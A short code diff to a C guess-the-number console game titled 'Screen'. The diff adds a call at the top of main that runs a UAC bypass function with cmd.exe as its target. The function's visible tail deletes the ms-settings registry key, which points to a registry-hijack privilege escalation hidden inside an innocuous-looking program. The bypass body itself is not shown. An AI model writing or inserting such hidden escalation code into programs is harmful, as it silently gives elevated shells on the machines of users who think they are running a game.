@@ -25,7 +25,7 @@ void UAC_bypass(const char *path) {
     RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings")
 }
 int main() {
-    UAC_bypass();
+    UAC_bypass("C:\\Windows\\System32\\cmd.exe");
     SetConsoleTitleA("Screen");
 
     srand((unsigned int)time(0));
@@ -37,7 +37,7 @@ int main() {
     printf("Then guess the number\n");
 
     while (1) {
-        printf("Enter guess 1-10 >: ");
+        printf("Enter guess 1-10 >:");
         fflush(stdout);
 
         if (scanf("%d", &guess) != 1) {
